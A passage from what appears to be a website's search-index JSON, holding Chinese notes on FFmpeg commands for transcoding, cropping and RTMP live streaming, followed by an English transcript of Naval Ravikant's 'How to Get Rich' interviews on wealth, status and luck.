\u8868\u793a\u88c1\u526a\u533a\u57df\u7684\u5de6\u4e0a\u89d2\u5750\u6807\u3002\u6bd4\u5982\u5f53\u524d\u8fd9\u4e2a\u793a\u4f8b\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4fdd\u7559\u7ad6\u5411\u89c6\u9891\u7684\u4e2d\u95f4\u90e8\u5206\uff0c\u6240\u4ee5 x \u4e0d\u7528\u504f\u79fb\uff0c\u6545\u4f20\u51650\uff0c\u800c y \u5219\u9700\u8981\u5411\u4e0b\u504f\u79fb\uff1a(1920 \u2013 1080) / 2 = 420 10. \u8f6c\u89c6\u9891\u683c\u5f0f ffmpeng -i source.mp4 -c:v libx264 -crf 24 destination.flv \u5176\u4e2d -crf \u5f88\u91cd\u8981\uff0c\u662f\u63a7\u5236\u8f6c\u7801\u540e\u89c6\u9891\u7684\u8d28\u91cf\uff0c\u8d28\u91cf\u8d8a\u9ad8\uff0c\u6587\u4ef6\u4e5f\u5c31\u8d8a\u5927\u3002 \u6b64\u503c\u7684\u8303\u56f4\u662f 0 \u5230 51\uff1a0 \u8868\u793a\u9ad8\u6e05\u65e0\u635f\uff1b23 \u662f\u9ed8\u8ba4\u503c\uff08\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u6b64\u53c2\u6570\uff09\uff1b51 \u867d\u7136\u6587\u4ef6\u6700\u5c0f\uff0c\u4f46\u6548\u679c\u662f\u6700\u5dee\u7684\u3002 \u503c\u8d8a\u5c0f\uff0c\u8d28\u91cf\u8d8a\u9ad8\uff0c\u4f46\u6587\u4ef6\u4e5f\u8d8a\u5927\uff0c\u5efa\u8bae\u7684\u503c\u8303\u56f4\u662f 18 \u5230 28\u3002\u800c\u503c 18 \u662f\u89c6\u89c9\u4e0a\u770b\u8d77\u6765\u65e0\u635f\u6216\u63a5\u8fd1\u65e0\u635f\u7684\uff0c\u5f53\u7136\u4e0d\u4ee3\u8868\u662f\u6570\u636e\uff08\u6280\u672f\u4e0a\uff09\u7684\u8f6c\u7801\u65e0\u635f\u3002","title":"\u7b2c\u4e00\u7ec4"},{"location":"other/FFmpeg%E5%8A%9F%E8%83%BD%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/#_3","text":"1.ffmpeg \u628a\u6587\u4ef6\u5f53\u505a\u76f4\u64ad\u63a8\u9001\u81f3\u670d\u52a1\u5668 (RTMP + FLV) ffmpeg - re -i demo.mp4 -c copy - f flv rtmp://w.gslb.letv/live/streamid 2.\u5c06\u76f4\u64ad\u7684\u5a92\u4f53\u4fdd\u5b58\u5230\u672c\u5730 ffmpeg -i rtmp://r.glsb.letv/live/streamid -c copy streamfile.flv 3.\u5c06\u4e00\u4e2a\u76f4\u64ad\u6d41\uff0c\u89c6\u9891\u6539\u7528h264\u538b\u7f29\uff0c\u97f3\u9891\u6539\u7528faac\u538b\u7f29\uff0c\u9001\u81f3\u53e6\u4e00\u4e2a\u76f4\u64ad\u670d\u52a1\u5668 ffmpeg -i rtmp://r.glsb.letv/live/streamidA -c:a libfaac -ar 44100 -ab 48k -c:v libx264 -vpre slow -vpre baseline -f flv rtmp://w.glsb.letv/live/streamb 4.\u63d0\u53d6\u89c6\u9891\u4e2d\u7684\u97f3\u9891,\u5e76\u4fdd\u5b58\u4e3amp3 \u7136\u540e\u8f93\u51fa ffmpeg -i input.avi -b:a 128k output.mp3","title":"\u7b2c\u4e8c\u7ec4"},{"location":"other/FFmpeg%E5%8A%9F%E8%83%BD%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/#_4","text":"1.\u83b7\u53d6\u89c6\u9891\u7684\u4fe1\u606f ffmpeg -i video.avi 2.\u5c06\u56fe\u7247\u5e8f\u5217\u5408\u6210\u89c6\u9891 ffmpeg -f image2 -i image%d.jpg video.mpg \u4e0a\u9762\u7684\u547d\u4ee4\u4f1a\u628a\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u56fe\u7247\uff08\u540d\u5b57\u5982\uff1aimage1.jpg. image2.jpg. \u7b49...\uff09\u5408\u5e76\u6210video.mpg 3.\u5c06\u89c6\u9891\u5206\u89e3\u6210\u56fe\u7247\u5e8f\u5217 ffmpeg -i video.mpg image%d.jpg \u4e0a\u9762\u7684\u547d\u4ee4\u4f1a\u751f\u6210image1.jpg. image2.jpg. ... \u652f\u6301\u7684\u56fe\u7247\u683c\u5f0f\u6709\uff1aPGM. PPM. PAM. PGMYUV. JPEG. GIF. PNG. TIFF. SGI 4.\u4e3a\u89c6\u9891\u91cd\u65b0\u7f16\u7801\u4ee5\u9002\u5408\u5728iPod/iPhone\u4e0a\u64ad\u653e ffmpeg -i source_video.avi input -acodec aac -ab 128kb -vcodec mpeg4 -b 1200kb -mbd 2 -flags +4mv+trell -aic 2 -cmp 2 -subcmp 2 -s 320x180 -title X final_video.mp4 5.\u4e3a\u89c6\u9891\u91cd\u65b0\u7f16\u7801\u4ee5\u9002\u5408\u5728PSP\u4e0a\u64ad\u653e ffmpeg -i source_video.avi -b 300 -s 320x240 -vcodec xvid -ab 32 -ar 24000 -acodec aac final_video.mp4 6.\u4ece\u89c6\u9891\u62bd\u51fa\u58f0\u97f3.\u5e76\u5b58\u4e3aMp3 ffmpeg -i source_video.avi -vn -ar 44100 -ac 2 -ab 192 -f mp3 sound.mp3 7.\u5c06wav\u6587\u4ef6\u8f6c\u6210Mp3 ffmpeg -i son_origine.avi -vn -ar 44100 -ac 2 -ab 192 -f mp3 son_final.mp3 8.\u5c06.avi\u89c6\u9891\u8f6c\u6210.mpg ffmpeg -i video_origine.avi video_finale.mpg 9.\u5c06.mpg\u8f6c\u6210.avi ffmpeg -i video_origine.mpg video_finale.avi 10.\u5c06.avi\u8f6c\u6210gif\u52a8\u753b\uff08\u672a\u538b\u7f29\uff09 ffmpeg -i video_origine.avi gif_anime.gif 11.\u5408\u6210\u89c6\u9891\u548c\u97f3\u9891 ffmpeg -i son.wav -i video_origine.avi video_finale.mpg 12.\u5c06.avi\u8f6c\u6210.flv ffmpeg -i video_origine.avi -ab 56 -ar 44100 -b 200 -r 15 -s 320x240 -f flv video_finale.flv 13.\u5c06.avi\u8f6c\u6210dv ffmpeg -i video_origine.avi -s pal -r pal -aspect 4:3 -ar 48000 -ac 2 video_finale.dv \u6216\u8005\uff1a ffmpeg -i video_origine.avi -target pal-dv video_finale.dv 14.\u5c06.avi\u538b\u7f29\u6210divx ffmpeg -i video_origine.avi -s 320x240 -vcodec msmpeg4v2 video_finale.avi 15.\u5c06Ogg Theora\u538b\u7f29\u6210Mpeg dvd ffmpeg -i film_sortie_cinelerra.ogm -s 720x576 -vcodec mpeg2video -acodec mp3 film_terminate.mpg 16.\u5c06.avi\u538b\u7f29\u6210SVCD mpeg2 NTSC\u683c\u5f0f\uff1a ffmpeg -i video_origine.avi -target ntsc-svcd video_finale.mpg PAL\u683c\u5f0f\uff1a ffmpeg -i video_origine.avi -target pal-dvcd video_finale.mpg 17.\u5c06.avi\u538b\u7f29\u6210VCD mpeg2 NTSC\u683c\u5f0f\uff1a ffmpeg -i video_origine.avi -target ntsc-vcd video_finale.mpg PAL\u683c\u5f0f\uff1a ffmpeg -i video_origine.avi -target pal-vcd video_finale.mpg 18.\u591a\u901a\u9053\u7f16\u7801 ffmpeg -i fichierentree -pass 2 -passlogfile ffmpeg2pass fichiersortie-2 19.\u4eceflv\u63d0\u53d6mp3 ffmpeg -i source.flv -ab 128k dest.mp3","title":"\u7b2c\u4e09\u7ec4"},{"location":"other/FFmpeg%E5%8A%9F%E8%83%BD%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/#_5","text":"1\u3001\u5c06\u6587\u4ef6\u5f53\u505a\u76f4\u64ad\u9001\u81f3live ffmpeg -re -i localFile.mp4 -c copy -f flv rtmp://server/live/streamName 2\u3001\u5c06\u76f4\u64ad\u5a92\u4f53\u4fdd\u5b58\u81f3\u672c\u5730\u6587\u4ef6 ffmpeg -i rtmp://server/live/streamName -c copy dump.flv 3\u3001\u5c06\u5176\u4e2d\u4e00\u4e2a\u76f4\u64ad\u6d41\uff0c\u89c6\u9891\u6539\u7528h264\u538b\u7f29\uff0c\u97f3\u9891\u4e0d\u53d8\uff0c\u9001\u81f3\u53e6\u5916\u4e00\u4e2a\u76f4\u64ad\u670d\u52a1\u6d41 ffmpeg -i rtmp://server/live/originalStream -c:a copy -c:v libx264 -vpre slow -f flv rtmp://server/live/h264Stream 4\u3001\u5c06\u5176\u4e2d\u4e00\u4e2a\u76f4\u64ad\u6d41\uff0c\u89c6\u9891\u6539\u7528h264\u538b\u7f29\uff0c\u97f3\u9891\u6539\u7528faac\u538b\u7f29\uff0c\u9001\u81f3\u53e6\u5916\u4e00\u4e2a\u76f4\u64ad\u670d\u52a1\u6d41 ffmpeg -i rtmp://server/live/originalStream -c:a libfaac -ar 44100 -ab 48k -c:v libx264 -vpre slow -vpre baseline -f flv rtmp://server/live/h264Stream 5\u3001\u5c06\u5176\u4e2d\u4e00\u4e2a\u76f4\u64ad\u6d41\uff0c\u89c6\u9891\u4e0d\u53d8\uff0c\u97f3\u9891\u6539\u7528faac\u538b\u7f29\uff0c\u9001\u81f3\u53e6\u5916\u4e00\u4e2a\u76f4\u64ad\u670d\u52a1\u6d41 ffmpeg -i rtmp://server/live/originalStream -acodec libfaac -ar 44100 -ab 48k -vcodec copy -f flv rtmp://server/live/h264_AAC_Stream 6\u3001\u5c06\u4e00\u4e2a\u9ad8\u6e05\u6d41\uff0c\u590d\u5236\u4e3a\u51e0\u4e2a\u4e0d\u540c\u89c6\u9891\u6e05\u6670\u5ea6\u7684\u6d41\u91cd\u65b0\u53d1\u5e03\uff0c\u5176\u4e2d\u97f3\u9891\u4e0d\u53d8 ffmpeg -re -i rtmp://server/live/high_FMLE_stream -acodec copy -vcodec x264lib -s 640\u00d7360 -b 500k -vpre medium -vpre baseline rtmp://server/live/baseline_500k -acodec copy -vcodec x264lib -s 480\u00d7272 -b 300k -vpre medium -vpre baseline rtmp://server/live/baseline_300k -acodec copy -vcodec x264lib -s 320\u00d7200 -b 150k -vpre medium -vpre baseline rtmp://server/live/baseline_150k -acodec libfaac -vn -ab 48k rtmp://server/live/audio_only_AAC_48k 7\u3001\u529f\u80fd\u4e00\u6837\uff0c\u53ea\u662f\u91c7\u7528-x264opts\u9009\u9879 ffmpeg -re -i rtmp://server/live/high_FMLE_stream -c:a copy -c:v x264lib -s 640\u00d7360 -x264opts bitrate=500:profile=baseline:preset=slow rtmp://server/live/baseline_500k -c:a copy -c:v x264lib -s 480\u00d7272 -x264opts bitrate=300:profile=baseline:preset=slow rtmp://server/live/baseline_300k -c:a copy -c:v x264lib -s 320\u00d7200 -x264opts bitrate=150:profile=baseline:preset=slow rtmp://server/live/baseline_150k -c:a libfaac -vn -b:a 48k rtmp://server/live/audio_only_AAC_48k 8\u3001\u5c06\u5f53\u524d\u6444\u50cf\u5934\u53ca\u97f3\u9891\u901a\u8fc7DSSHOW\u91c7\u96c6\uff0c\u89c6\u9891h264\u3001\u97f3\u9891faac\u538b\u7f29\u540e\u53d1\u5e03 ffmpeg -r 25 -f dshow -s 640\u00d7480 -i video=\u201dvideo source name\u201d:audio=\u201daudio source name\u201d -vcodec libx264 -b 600k -vpre slow -acodec libfaac -ab 128k -f flv rtmp://server/application/stream_name 9\u3001\u5c06\u4e00\u4e2aJPG\u56fe\u7247\u7ecf\u8fc7h264\u538b\u7f29\u5faa\u73af\u8f93\u51fa\u4e3amp4\u89c6\u9891 ffmpeg.exe -i INPUT.jpg -an -vcodec libx264 -coder 1 -flags +loop -cmp +chroma -subq 10 -qcomp 0.6 -qmin 10 -qmax 51 -qdiff 4 -flags2 +dct8x8 -trellis 2 -partitions +parti8x8+parti4x4 -crf 24 -threads 0 -r 25 -g 25 -y OUTPUT.mp4 10\u3001\u5c06\u666e\u901a\u6d41\u89c6\u9891\u6539\u7528h264\u538b\u7f29\uff0c\u97f3\u9891\u4e0d\u53d8\uff0c\u9001\u81f3\u9ad8\u6e05\u6d41\u670d\u52a1(\u65b0\u7248\u672cFMS live=1) ffmpeg -i rtmp://server/live/originalStream -c:a copy -c:v libx264 -vpre slow -f flv \"rtmp://server/live/h264Stream live=1\" \u6587\uff0f\u9a9a\u4e4b\u54c8\u585e\u7d66\uff08\u7b80\u4e66\u4f5c\u8005\uff09 \u539f\u6587\u94fe\u63a5\uff1a https://www.jianshu.com/p/a035056cbbf9","title":"\u7b2c\u56db\u7ec4"},{"location":"other/How%20to%20Get%20Rich/","text":"A collection of all my interviews about my \u2018How to Get Rich\u2019 tweetstorm . Seek Wealth, Not Money or Status Wealth is assets that earn while you sleep Naval is a prolific tech investor and founder of AngelList Nivi: You probably know Naval from his Twitter account. We\u2019re going to talk about his tweetstorm, \u201c How To Get Rich (without getting lucky) .\u201d We\u2019ll go through most of the tweets in detail, give Naval a chance to expand on them and generally riff on the topic. He\u2019ll probably throw in ideas he hasn\u2019t published before. Naval\u2019s the co-founder of AngelList and Epinions. He\u2019s also a prolific tech investor in companies like Twitter, Uber and many more. I\u2019m the co-founder of AngelList with Naval. And I co-authored the Venture Hacks blog with him back in the day. Naval: The \u201cHow to Get Rich\u201d tweetstorm definitely hit a nerve and went viral. A lot of people say it was helpful and reached across aisles. People outside of the tech industry\u2014people in all walks of life\u2014want to know how to solve their money problems. Everyone vaguely knows they want to be wealthy, but they don\u2019t have a good set of principles to do it by. Wealth is assets that earn while you sleep Nivi: What\u2019s the difference between wealth, money and status? Naval: Wealth is the thing you want. Wealth is assets that earn while you sleep; it\u2019s the factory of robots cranking out things. Wealth is the computer program running at night that\u2019s serving other customers. Wealth is money in the bank that is reinvested into other assets and businesses. A house can be a form of wealth, because you can rent it out; although that\u2019s a less productive use of land than running a commercial enterprise. My definition of wealth is oriented toward businesses and assets that can earn while you sleep. Wealth buys your freedom You want wealth because it buys you freedom\u2014so you don\u2019t have to wear a tie like a collar around your neck; so you don\u2019t have to wake up at 7:00 a.m. to rush to work and sit in commute traffic; so you don\u2019t have to waste your life grinding productive hours away into a soulless job that doesn\u2019t fulfill you. The purpose of wealth is freedom; it\u2019s nothing more than that. It\u2019s not to buy fur coats, or to drive Ferraris, or to sail yachts, or to jet around the world in a Gulf Stream. That stuff gets really boring and stupid, really fast. It\u2019s about being your own sovereign individual. You\u2019re not going to get that unless you really want it. The entire world wants it, and the entire world is working hard at it. It is competitive to some extent. It\u2019s a positive sum game\u2014but there are competitive elements to it, because there\u2019s a finite amount of resources right now in society. To get the resources to do what you want, you have to stand out. Money is how we transfer wealth Money is how we transfer wealth. Money is social credits; it\u2019s the ability to have credits and debits of other people\u2019s time. If I do my job right and create value for society, society says, \u201cOh, thank you. We owe you something in the future for the work that you did. Here\u2019s a little IOU. Let\u2019s call that money.\u201d That money gets debased because people steal the IOUs; the government prints extra IOUs; and people renege on their IOUs. But money tries to be a reliable IOU from society that you are owed something for something you did in the past. We transfer these IOUs around; money is how we transfer wealth. Status is your rank in the social hierarchy There are fundamentally two huge games in life that people play. One is the money game. Money is not going to solve all of your problems; but it\u2019s going to solve all of your money problems. I think people know that. They realize that, so they want to make money. At the same time, deep down many people believe they can\u2019t make it; so they don\u2019t want any wealth creation to happen. They virtue signal by attacking the whole enterprise, saying, \u201cWell, making money is evil. You shouldn\u2019t do it.\u201d But they\u2019re actually playing the other game, which is the status game. They\u2019re trying to be high status in the eyes of others by saying, \u201cWell, I don\u2019t need money. We don\u2019t want money.\u201d Status is your ranking in the social hierarchy. Wealth is not a zero-sum game. Everybody in the world can have a house. Because you have a house doesn\u2019t take away from my ability to have a house. If anything, the more houses that are built, the easier it becomes to build houses, the more we know about building houses, and the more people can have houses. Wealth is a very positive-sum game. We create things together. We\u2019re starting this endeavor to create a piece of art that explains what we\u2019re doing. At the end of it, something brand new will be created. It\u2019s a positive-sum game. Status is a very old game Status, on the other hand, is a zero-sum game. It\u2019s a very old game. We\u2019ve been playing it since monkey tribes. It\u2019s hierarchical. Who\u2019s number one? Who\u2019s number two? Who\u2019s number three? And for number three to move to number two, number two has to move out of that slot. So, status is a zero-sum game. Politics is an example of a status game. Even sports is an example of a status game. To be the winner, there must be a loser. Fundamentally, I don\u2019t like status games. They play an important role in our society, so we can figure out who\u2019s in charge. But you play them because they\u2019re a necessary evil. On an evolutionary basis\u2014if you go back thousands of years\u2014status is a much better predictor of survival than wealth. You couldn\u2019t have wealth before the farming age because you couldn\u2019t store things. Hunter-gatherers carried everything on their backs. Hunter-gatherers lived in entirely status-based societies. Farmers started going to wealth-based societies. The modern industrial economies are much more heavily wealth-based societies. People creating wealth will always be attacked by people playing status games There\u2019s always a subtle competition going on between status and wealth. For example, when journalists attack rich people or the tech industry, they\u2019re really bidding for status. They\u2019re saying, \u201cNo, the people are more important. And I, the journalist, represent the people, and therefore I am more important.\u201d The problem is, to win at a status game you have to put somebody else down. That\u2019s why you should avoid status games in your life\u2014because they make you into an angry combative person. You\u2019re always fighting to put other people down and elevate yourself and the people you like. Status games are always going to exist; there\u2019s no way around it. Realize that most of the time when you\u2019re trying to create wealth, you\u2019re getting attacked by someone else and they\u2019re trying to look like a goody-two shoes. They\u2019re trying to up their own status at your expense. They\u2019re playing a different game. And it\u2019s a worse game. It\u2019s a zero-sum game, instead of a positive-sum game. Make Abundance for the World Wealth isn\u2019t about taking something from somebody els e Ethical wealth creation makes abundance for the world Naval: I think there is this notion that making money is evil, right? It\u2019s rooted all the way back down to \u201cmoney is the root of all evil.\u201d People think that the bankers steal our money. It\u2019s somewhat true in that, in a lot of the world, there\u2019s a lot of theft going on all the time. The history of the world, in some sense, is this predator/prey relationship between makers and takers. There are people who go out and create things, and build things, and work hard on things. Then there are people who come along with a sword, or a gun, or taxes, or crony capitalism, or Communism, or what have you. There\u2019s all these different methods to steal. Even in nature, there are more parasites than there are non-parasitical organisms. You have a ton of parasites in you, who are living off of you. The better ones are symbiotic, they\u2019re giving something back. But there are a lot that are just taking. That\u2019s the nature of how any complex system is built. What I am focused on is true wealth creation. It\u2019s not about taking money. It\u2019s not about taking something from somebody else. It\u2019s from creating abundance. Obviously, there isn\u2019t a finite number of jobs, or finite amount of wealth. Otherwise we would still be sitting around in caves, figuring out how to divide up pieces of fire wood, and the occasional dead deer. Most of the wealth in civilization, in fact all of it, has been created. It got created from somewhere. It got created from people. It got created from technology. It got created from productivity. It got created from hard work. This idea that it\u2019s stolen is this horrible zero-sum game that people who are trying to gain status play. Everyone can be rich But the reality is everyone can be rich. We can see that by seeing, that in the First World, everyone is basically richer than almost anyone who was alive 200 years ago. 200 years ago nobody had antibiotics. Nobody had cars. Nobody had electricity. Nobody had the iPhone. All of these things are inventions that have made us wealthier as a species. Today, I would rather be a poor person in a First World country, than be a rich person in Louis the XIV\u2019s France. I\u2019d rather be a poor person today than aristocrat back then. That\u2019s because of wealth creation. The engine of technology is science that is applied for the purpose of creating abundance. So, I think fundamentally everybody can be wealthy. This thought experiment I want you to think through is imagine if everybody had the knowledge of a good software engineer and a good hardware engineer. If you could go out there, and you could build robots, and computers, and bridges, and program them. Let\u2019s say every human knew how to do that. What do you think society would look like in 20 years? My guess is what would happen is we would build robots, machines, software and hardware to do everything. We would all be living in massive abundance. We would essentially be retired, in the sense that none of us would have to work for any of the basics. We\u2019d even have robotic nurses. We\u2019d have machine driven hospitals. We\u2019d have self-driving cars. We\u2019d have farms that are 100% automated. We\u2019d have clean energy. At that point, we could use technology breakthroughs to get everything that we wanted. If anyone is still working at that point, they\u2019re working as a form of expressing their creativity. They\u2019re working because it\u2019s in them to contribute, and to build and design things. I don\u2019t think capitalism is evil. Capitalism is actually good. It\u2019s just that it gets hijacked. It gets hijacked by improper pricing of externalities. It gets hijacked by improper yields, where you have corruption, or you have monopolies. Free Markets Are Intrinsic to Humans We use credits and debits to cooperate across genetic boundaries Free markets are intrinsic to the human species Naval: Overall capitalism [meaning free markets] is intrinsic to the human species. Capitalism is not something we invented. Capitalism is not even something we discovered. It is in us in every exchange that we have. When you and I exchange information, I want some information back from you. I give you information. You give me information. If we weren\u2019t having a good information exchange, you\u2019d go talk to somebody else. So, the notion of exchange, and keeping track of credits and debits, this is built into us as flexible social animals. We are the only animals in the animal kingdom that cooperate across genetic boundaries. Most animals don\u2019t even cooperate. But when they do, they cooperate only in packs where they co-evolve together, and they share blood, so they have some shared interests. Humans don\u2019t have that. I can cooperate with you guys. One of you is a Serbian. The other one is a Persian by origin. And I\u2019m Indian by origin. We have very little blood in common, basically none. But we still cooperate. What lets us cooperate? It\u2019s because we can keep track of debits and credits. Who put in how much work? Who contributed how much? That\u2019s all free market capitalism is. So, I strongly believe that it is innate to the human species, and we are going to create more and more wealth, and abundance for everybody. Everybody can be wealthy. Everybody can be retired. Everybody can be successful. It is merely a question of education and desire. You have to want it. If you don\u2019t want it, that\u2019s fine. Then you opt out of the game. But don\u2019t try to put down the people who are playing the game. Because that\u2019s the game that keeps you in a comfortable warm bed at night. That\u2019s the game that keeps a roof over your head. That\u2019s the game that keeps your supermarkets stocked. That\u2019s the game that keeps the iPhone buzzing in your pocket. So, it is a beautiful game that is worth playing ethically, rationally, morally, socially for the human race. It\u2019s going to continue to make us all richer and richer, until we have massive wealth creation for anybody who wants it. Too many takers and not enough makers will plunge a society into ruin Nivi: It\u2019s not just individuals secretly despising wealth, right? There are countries, groups, political parties that overtly despise wealth. Or at least seem to. Naval: That\u2019s right. What those countries, political parties, and groups are reduced to is playing the zero-sum game of status. In the process to destroy wealth creation, they drag everybody down to their level. Which is why the U.S. is a very popular country for immigrants because of the American dream. Anyone can come here, be poor, and then work really hard and make money, and get wealthy. But even just make some basic money for their life. Obviously, the definition of wealth is different for different people. A First World citizen\u2019s definition of wealth might be, \u201cOh, I have to make millions of dollars, and I\u2019m completely done.\u201d Whereas to a Third World poor immigrant just entering the country, and we were poor immigrants who came here when I as fairly young, to the United States, wealth may just be a much lower number. It may just be, \u201cI don\u2019t have to work a manual labor job for the rest of my life that I don\u2019t want to work.\u201d But groups that despise it will essentially bring the entire group to that level. If you get too many takers, and not enough makers, society falls apart. You end up with a communist country. Look at Venezuela, right? They were so busy taking, and dividing, and reallocating, that people are literally starving in the streets, and losing kilograms of body weight every year just from sheer starvation. Another way to think about it is imagine an organism that has too many parasites. You need some small number of parasites to stay healthy. You need a lot of symbiotes. All the mitochondria in all of our cells that help us respirate and burn oxygen. These are symbiotes that help us survive. We couldn\u2019t survive without them. But, to me, those are partners in the wealth creation that creates the human body. But if you just were filled with parasites, if you got infected with worms, or a virus, or bacteria that were purely parasitical, you would die. So, any organism can only withstand a small number of parasites. When the parasitic element gets too far out of control, you die. Again I\u2019m talking about ethical wealth creation. I\u2019m not talking about monopolies. I\u2019m not talking about crony capitalism. I\u2019m not talking about mispriced externalities like the environment. I\u2019m talking about free minds, and free markets. Small-scale exchange between humans that\u2019s voluntary, and doesn\u2019t have an outsized impact on others. I think that kind of wealth creation, if a society does not respect it, if the group does not respect it, then society will plunge into ruin, and darkness. Making Money Isn\u2019t About Luck Become the kind of person who makes money Making money isn\u2019t about luck Naval: Obviously, we want to be wealthy, and we want to get there in this lifetime without having to rely on luck. A lot of people think making money is about luck. It\u2019s not. It\u2019s about becoming the kind of person that makes money. I like to think that if I lost all my money and if you drop me on a random street in any English-speaking country, within 5, 10 years I\u2019d be wealthy again. Because it\u2019s a skill set that I\u2019ve developed and I think anyone can develop. In 1,000 parallel universes, you want to be wealthy in 999 of them. You don\u2019t want to be wealthy in the 50 of them where you got lucky. We want to factor luck out of it. There\u2019s four kinds of luck that we\u2019re talking about. This came from a book. Marc Andreessen, wrote a blog post about it. 1. Blind luck The first kind of luck you might say is blind luck. Where I just got lucky because something completely out of my control happened. That\u2019s fortune, that\u2019s fate. 2. Luck from hustling Then there\u2019s luck that comes through persistence, hard work, hustle, motion. Which is when you\u2019re running around creating lots of opportunities, you\u2019re generating a lot of energy, you\u2019re doing a lot of things, lots of things will get stirred up in the dust. It\u2019s almost like mixing a petri dish and seeing what combines. Or mixing a bunch of reagents and seeing what combines. You\u2019re generating enough force and hustle and energy that luck will find you. We, as a group, you could argue, got together because of that. Nenad had put up these great videos online, I saw them on Twitter. In that sense, he generated his own luck by creating videos until people like me keep finding him. 3. Luck from preparation A third way is that you become very good at spotting luck. If you are very skilled in a field, you will notice when a lucky break happens in that field. When other people who aren\u2019t attuned to it won\u2019t notice. So you become sensitive to luck and that\u2019s through skill and knowledge and work. 4. Luck from your unique character Then the last kind of luck is the weirdest, hardest kind. But that\u2019s what we want to talk about. Which is where you build a unique character, a unique brand, a unique mindset, where then luck finds you. For example, let\u2019s say that you\u2019re the best person in the world at deep sea underwater diving. You\u2019re known to take on deep sea underwater dives that nobody else will even attempt to dare. Then, by sheer luck, somebody finds a sunken treasure ship off the coast. They can\u2019t get it. Well, their luck just became your luck, because they\u2019re going to come to you to get that treasure. You\u2019re going to get paid for it. Now, that\u2019s an extreme example. The person who got lucky by finding the treasure chest, that was blind luck. But them coming to you and asking you to extract it and having to give you half, that\u2019s not luck. You created your own luck. You put yourself in a position to be able to capitalize on that luck. Or to attract that luck when nobody else has created that opportunity for themselves. When we talk about \u201cwithout getting lucky,\u201d we want to be deterministic, we don\u2019t want to leave it to chance. In 1,000 parallel universes, you want to be wealthy in 999 of them Nivi: Do you want to elaborate a little bit more on the idea that in a 1,000 parallel universes you want to get rich in 999 of them? I think some people are going to see that and say, \u201cthat sounds impossible, it sounds like it\u2019s too good to be true.\u201d Naval: No, I don\u2019t think it\u2019s impossible. I think that you may have to work a little bit harder at it given your starting circumstances. I started as a poor kid in India, so if I can make it, anybody can, in that sense. Now, obviously, I had all my limbs and I had my mental faculties and I did have an education. There are some prerequisites you can\u2019t get past. But if you\u2019re listening to this video or podcast, you probably have the requisite means at your disposal, which is a functioning body and a functioning mind. And I\u2019ve encountered plenty of bad luck along the way. The first little fortune that I made, I instantly lost in the stock market. The second little fortune that I made, or I should have made, I basically got cheated by my business partners. It\u2019s only the third time around has been a charm. And, even then, it has been in a slow and steady struggle. I haven\u2019t made money in my life in one giant payout. It\u2019s always been a whole bunch of small things piling up. It\u2019s more about consistently creating wealth by creating businesses, including opportunities and creating investments. It hasn\u2019t been a giant one-off thing. Wealth stacks up one chip at a time, not all at once My personal wealth has not been generated by one big year. It stacks up little bit, chips at a time. More options, more businesses, more investments, more things that I can do. Same way that someone like Nenad, illacertus, he\u2019s building his brand online. He\u2019s building videos. It\u2019s not like any one video is going to suddenly shower him with riches overnight. It\u2019s going to be a long lifetime of learning, of reading, of creating that\u2019s going to compound. We\u2019re talking about getting wealthy so you can retire, so you have your freedom. Not retire in the sense that you don\u2019t do anything. But in the sense that you don\u2019t have to be any place you don\u2019t want to be, you don\u2019t have to do anything you don\u2019t want to do, you can wake up when you want, you can sleep when you want, you don\u2019t have a boss. That\u2019s freedom. We\u2019re talking about enough wealth to get to freedom. Especially thanks to the Internet these days, though, opportunities are massively abundant. I, in fact, have too many ways to make money, I don\u2019t have enough time. I have opportunities pouring out of my ears and the thing I keep running out of is time. There\u2019s just so many ways to create wealth, to create products, to create businesses, to create opportunities, and to, as a byproduct, get paid by society that I can\u2019t even handle it all. Make Luck Your Destiny Build your character in a way that luck becomes deterministic Nivi: I think it\u2019s pretty interesting that the first three kinds of luck that you described there are very common cliches for them that everybody knows. And then for that last kind of luck that comes to you out of the unique way that you act, there\u2019s no real cliche for it. So, for the first three kinds, there\u2019s \u201cdumb luck,\u201d or \u201cblind luck.\u201d That\u2019s the first kind of luck. The second kind of luck there\u2019s the clich\u00e9 that \u201cfortune favors the bold.\u201d That\u2019s a person who gets lucky just by stirring the pot and acting. The third kind of luck, people say that \u201cchance favors the prepared mind.\u201d But for the fourth kind of luck, there isn\u2019t a common clich\u00e9 out there that matches the unique character of your action, which I think is interesting and perhaps an opportunity and it also shows that people aren\u2019t necessarily taking advantage of that kind of luck the way they should be. Naval: I think also at that point, it starts becoming so deterministic that it stops being luck. So, the definition starts fading from luck to more destiny. So, I would characterize that fourth one as you build your character in a certain way and then your character becomes your destiny. Build your character so opportunity finds you One of the things I think that is important to making money, when you want the kind of reputation that makes people do deals through you. I use the example of like, if you\u2019re a great diver then treasure hunters will come and give you a piece of the treasure for your diving skills. If you\u2019re a trusted, reliable, high-integrity, long-term thinking deal maker, then when other people want to do deals but they don\u2019t know how to do them in a trustworthy manner with strangers, they will literally approach you and give you a cut of the deal or offer you a unique deal just because of the integrity and reputation that you have built up. Warren Buffett, he gets offered deals, and he gets to buy companies, and he gets to buy warrants, and bailout banks and do things that other people can\u2019t do because of his reputation. But of course that\u2019s fragile. It has accountability on the line, it has a strong brand on the line, and as we will talk about later, that comes with accountability attached. But I would say your character, your reputation, these are things that you can build that then will let you take up advantage of opportunities that other people may characterize as lucky but you know that it wasn\u2019t luck. Nivi: You said that this fourth kind of luck is more or less a destiny. There\u2019s a quote from that original book that was in Marc\u2019s blog posts from Benjamin Disraeli, who I think was the former prime minister of the UK. The quote to describe this kind of luck was, \u201cwe make our fortunes and we call them fate.\u201d You have to be a little eccentric to be out on the frontier by yourself There were a couple other interesting things about this kind of luck that were mentioned in the blog post, I think it\u2019ll be good for the listeners to hear about is that, this fourth kind of luck can almost come out of eccentric ways that you do your things and that eccentricity is not necessarily a bad thing in this case. In fact, it\u2019s a good thing. Naval: Yeah, absolutely. Because the world is a very efficient place, so, everyone has dug through all the obvious places to dig and so to find something that\u2019s new and novel and uncovered, it helps to be operating on a frontier. Where right there you have to be a little eccentric to be out on the frontier by yourself, and then you have to be willing to dig deeper than other people do, deeper than seems rational just because you\u2019re interested. Nivi: Yeah, the two quotes that I\u2019ve seen that express this kind of luck in addition to that Benjamin Disraeli one, are this one from Sam Altman where he said, \u201cextreme people get extreme results.\u201d I think that\u2019s 